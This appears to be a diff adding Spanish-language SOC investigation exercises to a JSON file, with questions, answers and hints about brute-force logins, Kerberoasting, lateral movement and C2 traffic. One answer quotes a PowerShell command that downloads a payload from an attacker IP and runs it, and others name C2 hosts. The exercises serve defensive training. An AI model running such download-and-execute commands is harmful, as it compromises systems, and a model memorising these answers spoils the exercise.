+          "acceptable": ["T1078", "Valid Accounts", "cuentas válidas"],
+          "hint": "El acceso exitoso con una cuenta válida después de la fuerza bruta corresponde a T1078."
+        },
+        {
+          "text": "¿Cuántos intentos fallidos de autenticación (EventID 4625) se registraron desde la IP atacante contra SRV-VPN01?",
+          "answer": "15",
+          "acceptable": ["quince", "15 intentos"],
+          "hint": "Cuenta los eventos 4625 con Source Network Address = 45.155.205.33 en SRV-VPN01."
+        },
+        {
+          "text": "¿Cuál fue el primer nombre de usuario probado por el atacante en el ataque?",
+          "answer": "admin",
+          "acceptable": [],
+          "hint": "Busca el primer evento 4625 en orden cronológico desde la IP atacante."
+        },
+        {
+          "text": "¿Qué proceso se ejecutó inmediatamente después del inicio de sesión exitoso y qué comando utilizó?",
+          "answer": "powershell.exe -Command \"Invoke-WebRequest -Uri http://45.155.205.33/payload.ps1 -OutFile C:\\Temp\\payload.ps1; C:\\Temp\\payload.ps1\"",
+          "acceptable": [],
+          "hint": "Revisa el CommandLine del proceso creado después del evento 4624 exitoso."
+        },
+        {
+          "text": "¿Qué dominio o IP se utilizó como C2 para descargar el payload?",
+          "answer": "45.155.205.33",
+          "acceptable": ["http://45.155.205.33"],
+          "hint": "Observa la URL en el comando de PowerShell o la conexión de red saliente."
+        },
+        {
+          "text": "¿Este caso es un Falso Positivo o un Verdadero Positivo?",
+          "answer": "Verdadero Positivo",
+          "acceptable": ["Verdadero Positivo", "VP", "vp", "verdadero positivo"],
+          "tipoPregunta": "veredicto",
+          "hint": "Revisa la cadena completa: fuerza bruta exitosa, descarga de payload y conexión a C2."
+        }
+      ]
+    },
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    {
+      "id": "caso-21",
+      "title": "Actividad inusual en controlador de dominio",
+      "difficulty": "dificil",
+      "difficultyLabel": "Difícil",
+      "category": "Movimiento lateral + Kerberoasting",
+      "context": "El SIEM generó una alerta por actividad anómala en un servidor crítico. Se requiere investigar el origen y alcance.",
+      "text": "Se reporta actividad fuera de lo común en el controlador de dominio durante la madrugada.",
+      "hint": "Revisa los eventos de creación de procesos, conexiones de red y autenticaciones.",
+      "target": [3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 28, 37, 44, 45, 46, 55, 60, 61, 62, 63],
+      "questions": [
+        {
+          "text": "¿Cuál es la dirección IP del servidor C2 utilizado para la exfiltración?",
+          "answer": "185.220.101.7",
+          "acceptable": [],
+          "hint": "Busca la IP de destino en conexiones salientes desde SRV-DC01 que no sean internas."
+        },
+        {
+          "text": "¿Qué usuario fue comprometido inicialmente para obtener acceso?",
+          "answer": "amorales",
+          "acceptable": [],
+          "hint": "Revisa el evento de creación de proceso de WINWORD.EXE y el usuario que lo ejecutó."
+        },
+        {
+          "text": "¿Qué host fue el primer punto de compromiso?",
+          "answer": "IT-ADMIN-05",
+          "acceptable": ["it-admin-05"],
+          "hint": "El agente donde se ejecutó la macro maliciosa."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK se utilizó para el movimiento lateral desde el host comprometido al servidor crítico?",
+          "answer": "T1078",
+          "acceptable": ["t1078", "Valid Accounts", "cuentas válidas"],
+          "hint": "Busca un inicio de sesión RDP (Logon Type 10) desde IT-ADMIN-05 a SRV-DC01 usando credenciales válidas."
+        },
+        {
+          "text": "¿Qué cuenta de servicio fue objetivo del ataque Kerberoasting?",
+          "answer": "svc_sql",
+          "acceptable": [],
+          "hint": "En el comando Invoke-Kerberoast, busca el nombre de la cuenta de servicio que aparece en los logs de creación de archivo hashes.txt."
+        },
+        {
+          "text": "¿Qué proceso malicioso se ejecutó para realizar el Kerberoasting?",
+          "answer": "powershell.exe",
+          "acceptable": ["powershell"],
+          "hint": "El comando Invoke-Kerberoast se ejecuta desde un proceso de PowerShell."
+        },
+        {
+          "text": "¿Cuál es el dominio C2 utilizado para la descarga inicial del payload?",
+          "answer": "cdn-update.azureedge.net",
+          "acceptable": [],
+          "hint": "Revisa la conexión de red de powershell.exe en IT-ADMIN-05 y busca el destino."
+        },
+        {
+          "text": "¿Qué evento de Windows indica la creación de persistencia en el sistema?",
+          "answer": "4698",
+          "acceptable": [],
+          "hint": "Busca eventos de creación de tarea programada en SRV-DC01."
+        },
+        {
+          "text": "¿Qué ID de evento de Sysmon corresponde a la conexión de red saliente hacia el C2?",
+          "answer": "3",
+          "acceptable": [],
+          "hint": "El evento de conexión de red en Sysmon tiene un ID específico."
+        },
+        {
+          "text": "¿Este caso es un Falso Positivo o un Verdadero Positivo?",
+          "answer": "Verdadero Positivo",
+          "acceptable": ["VP", "vp", "verdadero positivo"],
+          "hint": "Evalúa toda la cadena de ataque: acceso inicial, movimiento lateral, Kerberoasting, exfiltración y persistencia.",
+          "tipoPregunta": "veredicto"
+        }
+      ]
+    }
+  ]
+}
